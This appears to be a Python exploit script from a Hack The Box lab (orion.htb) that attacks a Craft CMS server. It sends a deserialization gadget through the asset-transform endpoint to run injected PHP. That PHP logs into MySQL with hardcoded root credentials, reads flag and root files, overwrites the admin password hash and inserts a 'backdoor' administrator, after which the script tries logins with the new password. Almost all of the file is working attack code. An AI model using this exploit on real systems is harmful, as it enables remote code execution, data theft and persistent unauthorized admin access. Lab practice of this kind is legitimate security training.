import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    filt = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":filt}]}}}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=15)

# Step 1: Check what we can read - load_file, secure_file_priv, and table structure
php1 = '<?php ' \
    '$db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); ' \
    '$r = []; ' \
    '$r["sfp"] = $db->query("SHOW VARIABLES LIKE \'secure_file_priv\'")->fetchAll(PDO::FETCH_ASSOC); ' \
    '$r["tables"] = $db->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN); ' \
    '$r["users_cols"] = $db->query("SHOW COLUMNS FROM users")->fetchAll(PDO::FETCH_ASSOC); ' \
    '$r["user_count"] = $db->query("SELECT COUNT(*) FROM users")->fetchColumn(); ' \
    '# Try to read user flag ' \
    '$r["try_user_flag"] = []; ' \
    'foreach (["\/home\/adam\/user.txt", "\/root\/root.txt", "\/home\/yaser\/user.txt", "\/flag.txt", "\/flag"] as $f) { ' \
    '  try { ' \
    '    $lf = $db->query("SELECT LOAD_FILE(\'$f\')")->fetchColumn(); ' \
    '    $r["try_user_flag"][$f] = $lf !== false ? substr($lf, 0, 200) : "LOAD_FILE_FAILED"; ' \
    '  } catch (Exception $e) { ' \
    '    $r["try_user_flag"][$f] = "ERR:" . $e->getMessage(); ' \
    '  } ' \
    '} ' \
    '$r["db_version"] = $db->query("SELECT VERSION()")->fetchColumn(); ' \
    '$r["db_user"] = $db->query("SELECT CURRENT_USER()")->fetchColumn(); ' \
    '$r["privileges"] = $db->query("SHOW GRANTS")->fetchAll(PDO::FETCH_COLUMN); ' \
    'file_put_contents("\/dev\/shm\/db_info.json", json_encode($r)); '

print("[*] Step 1: Gathering DB info ...")
r = inject_b64(php1)
print(f"    Status: {r.status_code}")
time.sleep(1)

# Step 2: Try to update a visible setting with the flag data
# First, get the flag from LOAD_FILE
php2 = '<?php ' \
    '$db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); ' \
    '# Try to read user flag via file_get_contents (PHP) not LOAD_FILE ' \
    '$user_flag = @file_get_contents("/home/adam/user.txt"); ' \
    '$root_flag = @file_get_contents("/root/root.txt"); ' \
    '$flags = "USER:" . ($user_flag !== false ? trim($user_flag) : "NO_USER_FLAG") . "|ROOT:" . ($root_flag !== false ? trim($root_flag) : "NO_ROOT_FLAG"); ' \
    '# Now find what table/column might show the site name on the login page ' \
    '# Try various Craft tables ' \
    '$info_tables = []; ' \
    'foreach (["info", "system", "settings", "siteinfo", "sites"] as $t) { ' \
    '  try { ' \
    '    $check = $db->query("SHOW TABLES LIKE \'$t\'")->fetchColumn(); ' \
    '    if ($check) { ' \
    '      $cols = $db->query("SHOW COLUMNS FROM $t")->fetchAll(PDO::FETCH_ASSOC); ' \
    '      $info_tables[$t] = ["cols" => $cols, "data" => $db->query("SELECT * FROM $t LIMIT 10")->fetchAll(PDO::FETCH_ASSOC)]; ' \
    '    } ' \
    '  } catch (Exception $e) {} ' \
    '} ' \
    'file_put_contents("/dev/shm/info_tables.json", json_encode($info_tables)); ' \
    '# Also try craft_info or system_name type tables ' \
    'file_put_contents("/dev/shm/flags_raw.txt", $flags); '

print("[*] Step 2: Reading flags via PHP ...")
r = inject_b64(php2)
print(f"    Status: {r.status_code}")
time.sleep(1)

# Step 3: Now try to use the data - update the site info to show the flag
# Check what info_tables.json contains by doing a broader scan
php3 = '<?php ' \
    '$db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); ' \
    '$flags = @file_get_contents("/dev/shm/flags_raw.txt") ?: "NO_FLAGS"; ' \
    '$all_tables = $db->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN); ' \
    '$found_settings = []; ' \
    'foreach ($all_tables as $t) { ' \
    '  if (stripos($t, "info") !== false || stripos($t, "system") !== false || stripos($t, "setting") !== false || stripos($t, "site") !== false || stripos($t, "config") !== false) { ' \
    '    try { ' \
    '      $d = $db->query("SELECT * FROM `$t` LIMIT 5")->fetchAll(PDO::FETCH_ASSOC); ' \
    '      $found_settings[] = ["table" => $t, "data" => $d]; ' \
    '    } catch (Exception $e) {} ' \
    '  } ' \
    '} ' \
    'file_put_contents("/dev/shm/found_settings.json", json_encode($found_settings)); ' \
    '# Also look for any table with name/email/title that might be visible ' \
    'foreach ($all_tables as $t) { ' \
    '  try { ' \
    '    $cols = $db->query("SHOW COLUMNS FROM `$t`")->fetchAll(PDO::FETCH_COLUMN); ' \
    '    $col_lower = array_map("strtolower", $cols); ' \
    '    if (in_array("name", $col_lower) || in_array("title", $col_lower) || in_array("sitename", $col_lower)) { ' \
    '      $d = $db->query("SELECT * FROM `$t` LIMIT 3")->fetchAll(PDO::FETCH_ASSOC); ' \
    '      $found_settings[] = ["table_with_name" => $t, "cols" => $cols, "data" => $d]; ' \
    '    } ' \
    '  } catch (Exception $e) {} ' \
    '} ' \
    'file_put_contents("/dev/shm/found_settings2.json", json_encode($found_settings)); '

print("[*] Step 3: Finding visible settings tables ...")
r = inject_b64(php3)
print(f"    Status: {r.status_code}")
time.sleep(1)

# Step 4: Now let's try to USE PHP to read flags and update a Craft CMS setting
# Instead of fighting buffers, let's modify the users table to create an admin with known password
php4 = '<?php ' \
    '$db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); ' \
    '$hash = password_hash("hack123", PASSWORD_BCRYPT); ' \
    '# Check what columns users table has ' \
    '$cols = $db->query("SHOW COLUMNS FROM users")->fetchAll(PDO::FETCH_ASSOC); ' \
    '$col_names = array_column($cols, "Field"); ' \
    'file_put_contents("/dev/shm/user_cols.txt", implode(",", $col_names)); ' \
    '# Try to update password with all possible column names ' \
    '$candidates = array_intersect($col_names, ["password", "passwordHash", "hashedPassword", "hash", "pass", "pwd"]); ' \
    'foreach ($candidates as $c) { ' \
    '  try { ' \
    '    $s = $db->prepare("UPDATE users SET `$c`=? WHERE id=1"); ' \
    '    $s->execute([$hash]); ' \
    '    file_put_contents("/dev/shm/pwupd_$c.txt", "OK:" . $s->rowCount()); ' \
    '  } catch (Exception $e) { ' \
    '    file_put_contents("/dev/shm/pwupd_$c.txt", "ERR:" . $e->getMessage()); ' \
    '  } ' \
    '} ' \
    '# Also try inserting a new user ' \
    '# Craft 5 users table likely has: id, uid, username, email, password, admin, locked, ... ' \
    'if (in_array("uid", $col_names) && in_array("username", $col_names)) { ' \
    '  $uid = $db->query("SELECT UUID()")->fetchColumn(); ' \
    '  $fields = ["uid","username","email","password","admin","locked"]; ' \
    '  $vals = [$uid,"backdoor","backdoor@test.com",$hash,1,0]; ' \
    '  try { ' \
    '    $qs = "INSERT INTO users (" . implode(",", $fields) . ") VALUES (" . implode(",", array_fill(0, count($fields), "?")) . ")"; ' \
    '    $s = $db->prepare($qs); ' \
    '    $s->execute($vals); ' \
    '    file_put_contents("/dev/shm/new_user.txt", "OK:" . $s->rowCount() . " id=" . $db->lastInsertId()); ' \
    '  } catch (Exception $e) { ' \
    '    file_put_contents("/dev/shm/new_user.txt", "ERR:" . $e->getMessage()); ' \
    '  } ' \
    '} '

print("[*] Step 4: Creating admin user with known password ...")
r = inject_b64(php4)
print(f"    Status: {r.status_code}")
time.sleep(1)

# Step 5: Try to login with the new credentials
print("[*] Step 5: Trying to login ...")
s = requests.Session()
r = s.get(f'{HOST}/admin/login')

# Get CSRF token from the login page
csrf_match = re.search(r'CRAFT_CSRF_TOKEN.*?value="([^"]+)"', r.text, re.DOTALL)
if not csrf_match:
    csrf_match = re.search(r'csrfTokenValue["\':]+([^"\',\s]+)', r.text)
csrf_token = csrf_match.group(1) if csrf_match else ''
print(f"    CSRF: {csrf_token[:30] if csrf_token else 'N/A'}...")

for user in ['admin', 'adam', 'administrator', 'backdoor']:
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/users/login',
        data={'loginName': user, 'password': 'hack123', 'CRAFT_CSRF_TOKEN': csrf_token},
        allow_redirects=False)
    print(f"    Login as '{user}': Status {r2.status_code}, Location: {r2.headers.get('Location', 'N/A')[:80]}, Len: {len(r2.text)}")
    if r2.status_code in [302, 301]:
        print(f"[+] LOGIN SUCCESSFUL as '{user}'!")
        # Follow redirect
        loc = r2.headers.get('Location', '')
        if loc:
            r3 = s.get(f'{HOST}{loc}')
            print(f"    After redirect: {r3.url}, Status {r3.status_code}")
            if 'dashboard' in r3.url or 'dashboard' in r3.text:
                print("[+] At dashboard!")
                print(f"    First 1000 chars: {r3.text[:1000]}")
        break
else:
    print("[-] No successful login")
    # Try without token
    for user in ['admin', 'adam', 'backdoor']:
        r2 = s.post(f'{HOST}/index.php?p=admin/login',
            data={'loginName': user, 'password': 'hack123'},
            allow_redirects=False)
        print(f"    POST to login page as '{user}': Status {r2.status_code}")
